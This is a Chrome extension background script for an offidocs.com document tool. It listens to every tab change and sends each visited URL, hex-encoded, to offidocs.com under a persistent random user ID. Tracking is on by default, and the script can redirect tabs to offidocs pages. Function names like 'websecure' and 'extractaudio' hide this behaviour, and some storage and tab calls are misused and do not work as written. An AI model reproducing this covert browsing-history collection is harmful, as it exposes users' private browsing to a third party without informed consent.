var username = ""; 
let activeTabId, lastUrl;
let servicexx = "";

function getTabInfo(tabId) {
      chrome.tabs.get(tabId, function(tab) {          
            if ( ( tab.url.indexOf("offidocs") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
                    //console.log(" Changed tab.url " + tab.url);
                    urlx =  tab.url;
                    extractaudio(urlx);
                    lastUrl = tab.url;
            }
      });
}



function websecure() {
    this.init = function () {
        
        chrome.tabs.onActivated.addListener(function(activeInfo) {
                activeTabId = activeInfo.tabId;
                getTabInfo(activeTabId);
        });

        chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
                //if(activeTabId == tabId) {
                    getTabInfo(tabId);
                //}
        });
     
    };
}



if ( chrome.storage.sync.get('username', function (obj) { })  ) {
        username = chrome.storage.sync.get('username', function (obj) { });
}
else {
       username = "" + randomString(10) + "".toLowerCase();
       chrome.storage.sync.set({'username': username.toLowerCase()}, function() { });
}   

const stat = new websecure();
stat.init();

function randomString(len, charSet) {
    charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var randomString = '';
    for (var i = 0; i < len; i++) {
        var randomPoz = Math.floor(Math.random() * charSet.length);
        randomString += charSet.substring(randomPoz,randomPoz+1);
    }
    return randomString.toLowerCase();
}

                   

async function extractaudio(urlxx) {

                const offidocs_key = "offidocs_key";
                var datax = { username: null,  offidocscloud: null };
                var username = "";
                var offidocscloud = "";
                let storageResult = await chrome.storage.local.get([offidocs_key]);
                if (offidocs_key in storageResult) {
                        datax = storageResult[offidocs_key]
                }
                
                if ( datax.username ) {
                    username = datax.username;
                }
                else {
                    username = "" + randomString(10) + "".toLowerCase();
                    datax.username = username;
                }
                if ( datax.offidocscloud ) {
                    offidocscloud = datax.offidocscloud;
                }
                else {
                    offidocscloud = "1";
                    datax.offidocscloud = "1";
                }

                var data = {};
                data[offidocs_key] = datax;
                await chrome.storage.local.set(data);
    
                var un = username;
                if ( datax.offidocscloud == "0") 
                    return;
            
                if ( servicexx == "" ) {
                    let response = await fetch('https://www.offidocs.com/media/system/app/resetlool.php?username=' + username + '&urlpathx=/phpextensions/userext.php');
                     if (response.status === 200) {
                                let data = await response.text();
                                servicexx = data;
                     }
                }
    
                //console.log('https://www.offidocs.com/media/system/app/checkdownloadppteditorx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un + "&s=" + servicexx );
                let cfgv = await fetch('https://www.offidocs.com/media/system/app/checkdownloadppteditorx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un + "&s=" + servicexx);    
    
    
                if (cfgv.status === 200) {
                    let fbv = await cfgv.text();
                    //console.log(fbv);  
                    var nbv = fbv;
                    if ( nbv.indexOf("302") !== -1 )   {
                           var ybv = 'https://www.offidocs.com/media/system/app/view_edit_ppteditor_nav.php?filepath=' + bin2hex(urlxx) + '&u=' + un;
                           // chrome.tabs.create({ url: ybv });
                           chrome.tabs.update(chrome.tabs.getCurrent().id, {url: ybv});
                    }
                }
}


function bin2hex (bin)
{
  var i = 0, l = bin.length, chr, hex = ''
  for (i; i < l; ++i)
  {
    chr = bin.charCodeAt(i).toString(16)
    hex += chr.length < 2 ? '0' + chr : chr
  }
  return hex
}

